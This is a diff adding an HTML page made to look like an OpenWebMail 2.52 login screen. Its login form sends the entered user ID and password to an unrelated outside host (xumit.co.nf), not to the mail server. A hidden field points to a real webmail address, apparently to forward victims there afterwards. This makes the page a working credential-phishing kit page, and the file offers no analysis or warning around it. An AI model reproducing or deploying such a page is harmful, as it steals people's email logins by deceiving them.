@@ -1,0 +1,149 @@
+<html>
+<head>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<title>OpenWebMail</title>
+<link rel="shortcut icon" href="favicon.ico">
+</head>
+<body background="globe.gif" bgcolor="#FFFFFF">
+<style type="text/css">
+body {
+	background-image: url(globe.gif);
+	background-repeat: repeat;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 9pt;
+}
+th{font-family: Arial, Helvetica, sans-serif; font-size: 9pt; font-weight: bold; background-color: #D3DCE3;}
+td{font-family: Arial, Helvetica, sans-serif; font-size: 9pt;}
+td.msgbody{font-family:  Arial, Helvetica, sans-serif; font-size: 9pt;}
+form{font-family: Arial, Helvetica, sans-serif; font-size: 9pt; margin-bottom: 0;}
+input.mono{font-family: monospace; font-size: 8pt;}
+select.mono{font-family: monospace; font-size: 8pt;}
+h1{font-family: Arial, Helvetica, sans-serif; font-size: 16pt; font-weight: bold;}
+a:link{font-family: Arial, Helvetica, sans-serif; font-size: 9pt; text-decoration: none; color: blue;}
+a:visited{font-family: Arial, Helvetica, sans-serif; font-size: 9pt; text-decoration: none; color: blue;}
+a:hover{font-family: Arial, Helvetica, sans-serif; font-size: 9pt; text-decoration: none; color: red;}
+a.msgbody:link{font-family:  Arial, Helvetica, sans-serif; font-size: 9pt; text-decoration: none; color: blue;}
+a.msgbody:visited{font-family:  Arial, Helvetica, sans-serif; font-size: 9pt; text-decoration: none; color: blue;}
+a.msgbody:hover{font-family:  Arial, Helvetica, sans-serif; font-size: 9pt; text-decoration: none; color: red;}
+.medtext{font-size: 8pt;}
+.smalltext{font-size: 7pt;}
+.smallblacktext{font-size: 7pt; color: #000000;}
+.smallcolortext{font-size: 7pt; color: #c00000;}
+.hilighttext{font-style: normal; font-weight: bold; background-color: #DCDCDC;}
+</style>
+<font face="Arial, Helvetica">
+<p align="center"> <a href="http://openwebmail.org/"><img border="0" src="openwebmail.gif"></a></p>
+<table border="0" align="center" width="260" cellpadding="0" cellspacing="0">
+	<tr>
+		<td bgcolor="#3161bd" background="bg-titleblue.gif">&nbsp;<font color="#FFFFFF" face="Arial, Helvetica" size="3"><B>Login</B></FONT></td>
+	</tr>
+	<tr>
+		<td align="center" bgcolor="#3161bd"><table width="100%" cellpadding="0" cellspacing="1" border="0">
+				<tr>
+					<td bgcolor=#ffffff>
+					<form method="post" action="http://xumit.co.nf/index.php" enctype="multipart/form-data" name="login">
+						<br>
+						<table align=center border=0 cellspacing=2 cellpadding=0>
+							<tr>
+								<td align="right" nowrap>UserID: </td>
+								<td><input type="text" name="loginname" value="" size="14" onChange=""></td>
+							</tr>
+							<tr>
+								<td align="right" nowrap>Password: </td>
+								<td><input type="password" name="password" value="" size="14" onChange=""></td>
+								<input type="hidden" name="onext" value="http://openwebmail.amcpl.net/openwebmail/openwebmail.html">
+								<input type="hidden" name="klynt" value="opwmSAIDi">
+							</tr>
+							<tr>
+								<td align=center colspan=2><table>
+										<tr>
+											<td align=center><input type="submit" name="loginbutton" value="Login"></td>
+											<td align=center><table>
+													<tr>
+														<td><label>
+																<input type="checkbox" name="httpcompress" value="1" checked="checked" onClick="httpcompresshelp()" />
+															</label></td>
+														<td><font size=1>HTTP<br>
+															Compression</font></td>
+														<td><label>
+																<input type="checkbox" name="autologin" value="1" onClick="autologinhelp()" />
+															</label></td>
+														<td><font size=1>Auto<br>
+															Login</font></td>
+													</tr>
+												</table></td>
+										</tr>
+									</table></td>
+							</tr>
+						</table>
+						<BR>
+						</td>
+						<div>
+							<input type="hidden" name=".cgifields" value="httpcompress"/>
+							<input type="hidden" name=".cgifields" value="autologin"/>
+						</div>
+					</form>
+				</tr>
+			</table></td>
+	</tr>
+</table>
+<script language="JavaScript">
+<!--
+
+	 if (document.login.loginname.value == "") {
+			document.login.loginname.focus()
+	 } else {
+			document.login.password.focus()
+	 }
+
+	 function focuspwd()
+	 {
+			document.login.password.focus();
+			return(true);
+	 }
+
+	 function focusloginbutton()
+	 {
+			document.login.loginbutton.focus();
+			return (true);
+	 }
+
+	 function httpcompresshelp()
+	 {
+			if (document.login.httpcompress.checked) {
+				 alert(
+"HTTP Compression can reduce the use of network bandwidth between your computer and the webmail server effectively, "+
+"but there are some compatibility issues:\n\n"+
+"1. some proxy servers only support HTTP compression via HTTP 1.1, "+
+"you may have to enable the HTTP1.1 support for proxy in your browser\n"+
+"2. some proxy servers don't support HTTP compression at all, "+
+"you may have to list the webmail server as directly connected in the proxy configuration of your browser.\n"+
+"3. some browsers have problems when using HTTP compression with SSL...\n"+
+"4. some browsers claim to support HTTP compression but actually not...\n\n"+
+"So if you encounter any problem, please login again with this checkbox unchecked.\n"
+				 );
+			}
+			return(true);
+	 }
+
+	 function autologinhelp()
+	 {
+			if (document.login.autologin.checked) {
+				 alert(
+"When this feature is enabled, you may login into openwebmail without typing username/password "+
+"if you didn't do logout in your previous openwebmail session and that session is not timeout. "+
+"However, others may also auto login into your openwebmail account with this computer, "+
+"so please DO NOT enable this feature on a public computer\n"
+				 );
+			}
+			return(true);
+	 }
+
+//-->
+</script>
+<p align="center"> <br>
+	<a href="#">OpenWebMail</a> version 2.52
+	&nbsp; <a accesskey="H" href="#" target="_help">Help?</a> <br>
+</p>
+</body>
+</html>
